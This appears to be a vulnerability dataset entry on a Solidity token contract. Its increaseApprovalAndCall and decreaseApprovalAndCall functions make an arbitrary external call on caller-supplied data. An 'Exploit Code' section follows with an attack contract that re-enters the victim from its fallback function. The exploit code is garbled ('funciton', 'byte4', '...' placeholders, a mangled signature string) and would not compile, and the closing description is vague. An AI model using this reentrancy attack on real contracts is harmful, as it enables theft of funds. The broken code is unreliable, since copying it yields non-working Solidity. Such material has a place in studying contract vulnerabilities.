## Vulnerable Code

```javascript
**Instance_1**
function increaseApprovalAndCall(
    address _spender,
    uint _addedValue,
    bytes _data
  )
    public
    payable
    returns (bool)
  {
    require(_spender != address(this));

    super.increaseApproval(_spender, _addedValue);

    // solium-disable-next-line security/no-call-value
    require(_spender.call.value(msg.value)(_data)); //Vulnerable position

    return true;
  }



**Instance_2**
function decreaseApprovalAndCall(
    address _spender,
    uint _subtractedValue,
    bytes _data
    )
    public
    payable
    returns (bool)
    {
    require(_spender != address(this));

    decreaseApproval(_spender, _subtractedValue);   // code different


    require(_spender.call.value(msg.value)(_data));

    return true;
}
```



## Exploit Code

```javascript
Contract Attack {
    uint count;
    address victimAddress;
    bytes  bs4 = new bytes(4);
    bytes4 functionSignature = bytes4(keccak256("startAttvvvvvvvvvack()"));
    function setVictim(address  _victim){
        victimAddress = _victim;
    }
    function startAttack(){
       for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        victimAddress.call(byte4(keccak256("increaseApprovalAndCall(address, uint, bytes)")), ...,  ..., bs4);
    }
    funciton() payable{
      for (uint i = 0; i< bs4.length; i++){
            bs4[i] = functionSignature[i];
        }
        count++;
        if(count < 5){
            victimAddress.call(byte4(keccak256("increaseApprovalAndCall(address, uint, bytes)")), ...,  ..., bs4);
        }
    }
}
```



##  Sophisticated Vulnerability Description
Look at the row "vulnerability position".The variable '_spender' can be manipulated any value by a malicious contract
